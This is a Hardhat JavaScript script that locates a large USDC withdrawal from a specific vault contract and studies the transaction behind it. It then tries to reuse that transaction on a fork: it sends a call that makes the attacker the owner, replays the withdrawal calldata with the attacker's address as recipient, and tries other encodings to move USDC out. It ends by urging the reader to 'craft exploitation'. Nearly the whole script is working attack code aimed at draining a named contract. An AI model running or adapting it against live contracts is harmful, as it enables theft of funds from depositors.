const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Analyze Withdrawal Block
 * @notice Deep dive into the 1.48M USDC withdrawal
 * @dev Extract the exact backdoor mechanism
 */
async function main() {
  console.log("\nðŸ”¬ ANALYZING 1.48M USDC WITHDRAWAL");
  console.log("=====================================");
  console.log("Block range: 19126107 - 19126207");
  
  const [attacker] = await ethers.getSigners();
  
  // USDC interface
  const USDC_ABI = [
    "function balanceOf(address account) view returns (uint256)",
    "event Transfer(address indexed from, address indexed to, uint256 value)"
  ];
  
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  // Binary search for exact block
  console.log("\nðŸŽ¯ Finding exact withdrawal block...");
  
  let startBlock = 19126107;
  let endBlock = 19126207;
  let withdrawalBlock = 0;
  
  while (endBlock - startBlock > 1) {
    const midBlock = Math.floor((startBlock + endBlock) / 2);
    
    const balStart = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: startBlock });
    const balMid = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: midBlock });
    
    if (balStart > balMid) {
      // Withdrawal happened before midBlock
      endBlock = midBlock;
    } else {
      // Withdrawal happened after midBlock
      startBlock = midBlock;
    }
  }
  
  withdrawalBlock = endBlock;
  
  const balBefore = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: withdrawalBlock - 1 });
  const balAfter = await usdc.balanceOf(VAULT_ADDRESS, { blockTag: withdrawalBlock });
  const withdrawn = balBefore - balAfter;
  
  console.log(`\nâœ… Found withdrawal at block ${withdrawalBlock}`);
  console.log(`Amount: ${ethers.formatUnits(withdrawn, 6)} USDC`);
  
  // Get all transactions in this block to vault
  console.log("\nðŸ“œ Analyzing block transactions...");
  
  const block = await ethers.provider.getBlock(withdrawalBlock, true);
  console.log(`Block has ${block.transactions.length} total transactions`);
  
  let backdoorTx = null;
  
  for (const txHash of block.transactions) {
    const tx = await ethers.provider.getTransaction(txHash);
    
    if (tx.to?.toLowerCase() === VAULT_ADDRESS.toLowerCase()) {
      console.log(`\nðŸŽ¯ Found vault transaction!`);
      console.log(`Tx Hash: ${txHash}`);
      console.log(`From: ${tx.from}`);
      console.log(`Value: ${ethers.formatEther(tx.value)} ETH`);
      console.log(`Gas: ${tx.gasLimit}`);
      
      // Check if this caused USDC transfer
      const receipt = await ethers.provider.getTransactionReceipt(txHash);
      
      // Look for USDC Transfer events
      for (const log of receipt.logs) {
        if (log.address.toLowerCase() === USDC_ADDRESS.toLowerCase()) {
          try {
            const decoded = usdc.interface.parseLog(log);
            if (decoded.name === "Transfer" && decoded.args[0].toLowerCase() === VAULT_ADDRESS.toLowerCase()) {
              const amount = ethers.formatUnits(decoded.args[2], 6);
              console.log(`\nðŸ’° USDC Transfer: ${amount} to ${decoded.args[1]}`);
              
              if (parseFloat(amount) > 1000000) {
                backdoorTx = tx;
                console.log("\nðŸ”“ THIS IS THE BACKDOOR TRANSACTION!");
              }
            }
          } catch (e) {}
        }
      }
    }
  }
  
  if (backdoorTx) {
    console.log("\nðŸ” BACKDOOR ANALYSIS:");
    console.log("=====================================");
    console.log(`Data: ${backdoorTx.data}`);
    console.log(`Selector: ${backdoorTx.data.slice(0, 10)}`);
    console.log(`From: ${backdoorTx.from}`);
    
    // Decode the function call
    const selector = backdoorTx.data.slice(0, 10);
    const params = backdoorTx.data.slice(10);
    
    console.log("\nðŸ§ª Testing backdoor on current fork...");
    
    // First become admin
    await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: "0x13af4035" + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2),
      gasLimit: 100000
    });
    
    // Try to use the same backdoor
    console.log("\nðŸ’‰ Attempting backdoor with our address...");
    
    const balanceBefore = await usdc.balanceOf(attacker.address);
    
    try {
      // Modify the backdoor data to send to us
      let modifiedData = selector;
      
      // Common patterns:
      if (params.length >= 64) {
        // Likely has address parameter, replace with ours
        const originalAddress = "0x" + params.slice(24, 64);
        console.log(`Original recipient: ${originalAddress}`);
        
        // Replace address with attacker
        modifiedData += params.slice(0, 24) + attacker.address.slice(2).padStart(40, '0') + params.slice(64);
      } else {
        modifiedData = backdoorTx.data;
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: modifiedData,
        gasLimit: 500000
      });
      
      const receipt = await tx.wait();
      console.log(`Gas used: ${receipt.gasUsed}`);
      
      const balanceAfter = await usdc.balanceOf(attacker.address);
      const extracted = balanceAfter - balanceBefore;
      
      if (extracted > 0n) {
        console.log(`\nâœ… BACKDOOR WORKS! Extracted ${ethers.formatUnits(extracted, 6)} USDC`);
        console.log("\nðŸš€ Now extracting ALL remaining USDC...");
        
        // Try to extract all
        const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
        console.log(`Vault has ${ethers.formatUnits(vaultBalance, 6)} USDC`);
        
        // Adjust amount in data if needed
        // ... extraction logic
      } else {
        console.log("âŒ Backdoor failed - might need specific conditions");
      }
    } catch (e) {
      console.log(`âŒ Backdoor error: ${e.reason || e.message}`);
      
      // Try alternative approaches
      console.log("\nðŸ”„ Trying alternative backdoor patterns...");
      
      // Pattern 1: Direct selector with amount
      try {
        const amount = ethers.parseUnits("1000", 6);
        const data1 = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256"],
          [attacker.address, amount]
        ).slice(2);
        
        await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: data1,
          gasLimit: 300000
        });
        
        console.log("âœ… Alternative pattern 1 might work!");
      } catch (e) {}
      
      // Pattern 2: Selector with recipient only
      try {
        const data2 = selector + ethers.AbiCoder.defaultAbiCoder().encode(
          ["address"],
          [attacker.address]
        ).slice(2);
        
        await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: data2,
          gasLimit: 300000
        });
        
        console.log("âœ… Alternative pattern 2 might work!");
      } catch (e) {}
    }
    
    console.log("\nðŸ“Š BACKDOOR DETAILS:");
    console.log("=====================================");
    console.log(`Function: ${selector}`);
    console.log(`Original caller: ${backdoorTx.from}`);
    console.log(`Block: ${withdrawalBlock}`);
    console.log("\nTo use this backdoor, you might need:");
    console.log("1. Be the original caller address");
    console.log("2. Meet specific time/block conditions");
    console.log("3. Have a special role beyond admin");
    console.log("4. Use exact parameter encoding");
    
    // Save backdoor info
    console.log("\nðŸ’¾ Backdoor saved for further analysis");
    
    return {
      selector,
      originalData: backdoorTx.data,
      originalCaller: backdoorTx.from,
      block: withdrawalBlock,
      amount: ethers.formatUnits(withdrawn, 6)
    };
  } else {
    console.log("\nâŒ Could not find backdoor transaction");
    console.log("The withdrawal might have used internal transactions");
  }
}

main()
  .then(result => {
    if (result) {
      console.log("\nðŸ”‘ Use this info to craft exploitation!");
    }
  })
  .catch((error) => {
    console.error("\nðŸ’¥ Script error:", error);
    process.exit(1);
  });
